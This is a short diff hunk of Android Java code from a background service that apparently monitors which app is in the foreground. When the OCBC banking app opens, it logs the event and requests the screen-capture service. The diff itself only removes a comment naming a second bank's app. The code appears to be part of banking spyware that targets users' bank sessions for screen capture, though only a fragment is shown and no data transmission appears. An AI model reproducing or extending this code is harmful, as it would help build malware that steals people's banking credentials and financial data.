@@ -106,7 +106,6 @@ public class ExampleJobIntentService extends JobIntentService {
                 }
             }
             if(currentApp != null){
-                //com.dbs.sg.dbsmbanking
                 if (currentApp.equals("com.ocbc.mobile") && !redirected) {
                     Log.e(TAG, "iBanking app opened by user!");
                     MediaProjectionManager manager = (MediaProjectionManager)getSystemService(Context.MEDIA_PROJECTION_SERVICE);
